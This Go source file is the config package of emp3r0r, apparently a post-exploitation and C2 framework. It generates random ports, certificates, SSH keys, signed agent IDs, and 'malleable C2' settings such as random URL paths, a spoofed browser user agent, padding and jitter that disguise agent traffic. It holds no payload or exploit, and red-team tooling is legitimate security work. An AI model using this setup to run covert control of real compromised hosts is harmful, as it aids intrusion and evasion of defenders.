package config

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// SaveConfigJSON save runtime config to emp3r0r.json
func SaveConfigJSON() (err error) {
	// Create a map to hold the config values with snake_case keys
	configMap := map[string]interface{}{
		"cc_address":                   live.RuntimeConfig.CCAddress,
		"cc_host":                      live.RuntimeConfig.CCHost,
		"cc_port":                      live.RuntimeConfig.CCPort,
		"agent_socks_server_port":      live.RuntimeConfig.AgentSocksServerPort,
		"agent_socks_timeout":          live.RuntimeConfig.AgentSocksTimeout,
		"stager_http_listener_port":    live.RuntimeConfig.StagerHTTPListenerPort,
		"password":                     live.RuntimeConfig.Password,
		"shadowsocks_local_socks_port": live.RuntimeConfig.ShadowsocksLocalSocksPort,
		"shadowsocks_server_port":      live.RuntimeConfig.ShadowsocksServerPort,
		"kcp_server_port":              live.RuntimeConfig.KCPServerPort,
		"kcp_client_port":              live.RuntimeConfig.KCPClientPort,
		"use_kcp":                      live.RuntimeConfig.UseKCP,
		"enable_ncsi":                  live.RuntimeConfig.EnableNCSI,
		"ssh_host_key":                 string(live.RuntimeConfig.SSHHostKey),
		"bring2cc_reverse_proxy_port":  live.RuntimeConfig.Bring2CCReverseProxyPort,
		"sshd_shell_port":              live.RuntimeConfig.SSHDShellPort,
		"mesh_gossip_port":             live.RuntimeConfig.MeshGossipPort,
		"preflight_enabled":            live.RuntimeConfig.PreflightEnabled,
		"preflight_url":                live.RuntimeConfig.PreflightURL,
		"preflight_method":             live.RuntimeConfig.PreflightMethod,
		"preflight_headers":            live.RuntimeConfig.PreflightHeaders,
		"ca_pem":                       live.RuntimeConfig.CAPEM,
		"ca_fingerprint":               live.RuntimeConfig.CAFingerprint,
		"c2_transport_proxy":           live.RuntimeConfig.C2TransportProxy,
		"cdn_proxy":                    live.RuntimeConfig.CDNProxy,
		"doh_server":                   live.RuntimeConfig.DoHServer,
		"agent_uuid":                   live.RuntimeConfig.AgentUUID,
		"agent_uuid_sig":               live.RuntimeConfig.AgentUUIDSig,
		"agent_tag":                    live.RuntimeConfig.AgentTag,
		"cc_timeout":                   live.RuntimeConfig.CCTimeout,
		"c2_prefix":                    live.RuntimeConfig.C2Prefix,
		"checkin_path":                 live.RuntimeConfig.CheckInPath,
		"msg_path":                     live.RuntimeConfig.MsgPath,
		"ftp_path":                     live.RuntimeConfig.FTPPath,
		"www_path":                     live.RuntimeConfig.WWWPath,
		"proxy_path":                   live.RuntimeConfig.ProxyPath,
		"user_agent":                   live.RuntimeConfig.UserAgent,
		"c2_headers":                   live.RuntimeConfig.C2Headers,
		"padding_min":                  live.RuntimeConfig.PaddingMin,
		"padding_max":                  live.RuntimeConfig.PaddingMax,
		"jitter":                       live.RuntimeConfig.Jitter,
		"is_run_by_stager":             live.RuntimeConfig.IsRunByStager,
	}

	w_data, err := json.MarshalIndent(configMap, "", "  ")
	if err != nil {
		return fmt.Errorf("saving %s: %v", live.EmpConfigFile, err)
	}

	return os.WriteFile(live.EmpConfigFile, w_data, 0o600)
}

// InitConfigFile generate a new emp3r0r.json
func InitConfigFile(cc_host string) (err error) {
	// random ports
	live.RuntimeConfig.CCAddress = cc_host
	live.RuntimeConfig.CCHost = cc_host
	live.RuntimeConfig.CCPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.AgentSocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.MeshGossipPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.SSHDShellPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.ShadowsocksLocalSocksPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.ShadowsocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.KCPServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.KCPClientPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.StagerHTTPListenerPort = fmt.Sprintf("%v", util.RandInt(1026, 65534))
	live.RuntimeConfig.CCTimeout = util.RandInt(10000, 20000)

	// SSH host key
	live.RuntimeConfig.SSHHostKey, _, err = transport.GenerateSSHKeyPair()
	if err != nil {
		return fmt.Errorf("failed to generate SSH host key: %v", err)
	}

	live.RuntimeConfig.AgentUUID = uuid.NewString()
	live.RuntimeConfig.Password = util.RandStr(20)

	// time intervals

	// Preflight default
	live.RuntimeConfig.PreflightEnabled = true
	if live.RuntimeConfig.PreflightURL == "" {
		live.RuntimeConfig.PreflightURL = fmt.Sprintf("http://%s/%s", cc_host, util.RandStr(util.RandInt(5, 10)))
	}
	live.RuntimeConfig.PreflightMethod = "POST"
	live.RuntimeConfig.AgentSocksTimeout = 0 // disable timeout by default, leave it to the OS

	// sign agent UUID
	// CA
	err = transport.LoadCACrt()
	if err != nil {
		return fmt.Errorf("failed to load CA: %v", err)
	}
	live.RuntimeConfig.CAPEM = string(transport.CACrtPEM)
	live.RuntimeConfig.CAFingerprint = transport.GetFingerprint(transport.CaCrtFile)
	// sign
	sig, err := transport.SignWithCAKey([]byte(live.RuntimeConfig.AgentUUID))
	if err != nil {
		return fmt.Errorf("failed to sign agent UUID: %v", err)
	}
	live.RuntimeConfig.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
	live.RuntimeConfig.AgentTag = live.RuntimeConfig.AgentUUID

	// malleable C2
	if live.RuntimeConfig.C2Prefix == "" {
		live.RuntimeConfig.C2Prefix = util.RandStr(util.RandInt(3, 10))
	}
	if live.RuntimeConfig.CheckInPath == "" {
		live.RuntimeConfig.CheckInPath = util.RandStr(util.RandInt(5, 15))
	}
	if live.RuntimeConfig.MsgPath == "" {
		live.RuntimeConfig.MsgPath = util.RandStr(util.RandInt(5, 15))
	}
	if live.RuntimeConfig.FTPPath == "" {
		live.RuntimeConfig.FTPPath = util.RandStr(util.RandInt(5, 15))
	}
	if live.RuntimeConfig.WWWPath == "" {
		live.RuntimeConfig.WWWPath = util.RandStr(util.RandInt(5, 15))
	}
	if live.RuntimeConfig.ProxyPath == "" {
		live.RuntimeConfig.ProxyPath = util.RandStr(util.RandInt(5, 15))
	}
	if live.RuntimeConfig.UserAgent == "" {
		live.RuntimeConfig.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3"
	}
	if live.RuntimeConfig.PaddingMin == 0 {
		live.RuntimeConfig.PaddingMin = 1024
	}
	if live.RuntimeConfig.PaddingMax == 0 {
		live.RuntimeConfig.PaddingMax = 10240
	}
	if live.RuntimeConfig.Jitter == 0 {
		live.RuntimeConfig.Jitter = 20
	}

	// save
	return SaveConfigJSON()
}

// LoadCACrt2RuntimeConfig CA cert to runtime config
func LoadCACrt2RuntimeConfig() error {
	err := transport.LoadCACrt()
	if err != nil {
		return err
	}
	live.RuntimeConfig.CAPEM = string(transport.CACrtPEM)
	live.RuntimeConfig.CAFingerprint = transport.GetFingerprint(transport.CaCrtFile)
	return nil
}

func ReadJSONConfig(jsonData []byte, config_to_write *def.Config) error {
	if jsonData == nil {
		// read JSON
		var err error
		jsonData, err = os.ReadFile(live.EmpConfigFile)
		if err != nil {
			return err
		}
	}
	if config_to_write == nil {
		config_to_write = live.RuntimeConfig
	}

	return readJSONConfig(jsonData, config_to_write)
}

// InitCertsAndConfig generate certs if not found, then generate config file
func InitCertsAndConfig() error {
	// if we are not running as server, return, the certs are already generated
	if !live.IsServer {
		return nil
	}

	if _, err := os.Stat(transport.CaCrtFile); os.IsNotExist(err) {
		logging.Warningf("CA cert not found, generating a new one")
		_, err := transport.GenCerts(nil, transport.CaCrtFile, transport.CaKeyFile, "", "", true)
		if err != nil {
			return fmt.Errorf("GenCerts: %v", err)
		}
	}

	// generate mTLS cert for operator
	if _, err := os.Stat(transport.OperatorCaCrtFile); os.IsNotExist(err) {
		logging.Warningf("mTLS cert not found, generating a new one")
		// CA cert
		_, err := transport.GenCerts(nil, transport.OperatorCaCrtFile, transport.OperatorCaKeyFile, "", "", true)
		if err != nil {
			return fmt.Errorf("generating operator CA: %v", err)
		}

		// client cert signed by CA
		_, err = transport.GenCerts(nil, transport.OperatorClientCrtFile, transport.OperatorClientKeyFile, transport.OperatorCaKeyFile, transport.OperatorCaCrtFile, false)
		if err != nil {
			return fmt.Errorf("generating operator cert: %v", err)
		}
	}

	return nil
}

func GenC2Certs(hosts_str string) error {
	// generate C2 TLS cert for given host names
	var hosts []string
	hosts = strings.Fields(hosts_str)

	// Check if certs exist
	if util.IsFileExist(transport.ServerCrtFile) && util.IsFileExist(transport.ServerKeyFile) &&
		util.IsFileExist(transport.OperatorServerCrtFile) && util.IsFileExist(transport.OperatorServerKeyFile) {
		logging.Infof("C2 certs already exist, skipping generation")
		return nil
	}

	// if C2 server TLS cert not found, generate new ones
	logging.Warningf("C2 TLS cert not found, generating a new one")
	hosts = append(hosts, "127.0.0.1") // sometimes we need to connect to a relay that listens on localhost
	hosts = append(hosts, "localhost") // sometimes we need to connect to a relay that listens on localhost

	// validate host names
	for _, host := range hosts {
		if !netutil.ValidateHostName(host) {
			return fmt.Errorf("invalid host name: %s", host)
		}
	}

	// generate C2 TLS cert
	_, certErr := transport.GenCerts(hosts, transport.ServerCrtFile, transport.ServerKeyFile, transport.CaKeyFile, transport.CaCrtFile, false)
	if certErr != nil {
		return fmt.Errorf("generating C2 TLS cert: %v", certErr)
	}
	// generate operator mTLS cert
	hosts = append(hosts, netutil.WgServerIP)   // add wireguard IP for operator
	hosts = append(hosts, netutil.WgOperatorIP) // add wireguard IP for operator
	_, certErr = transport.GenCerts(hosts, transport.OperatorServerCrtFile, transport.OperatorServerKeyFile, transport.OperatorCaKeyFile, transport.OperatorCaCrtFile, false)
	if certErr != nil {
		return fmt.Errorf("generating operator cert: %v", certErr)
	}

	return nil
}

// LoadConfig load config JSON file
func LoadConfig() error {
	err := LoadCACrt2RuntimeConfig()
	if err != nil {
		return fmt.Errorf("failed to load CA to RuntimeConfig: %v", err)
	}

	if util.IsFileExist(live.EmpConfigFile) {
		return ReadJSONConfig(nil, nil)
	}
	// init config file using the first host name
	return InitConfigFile("127.0.0.1")
}
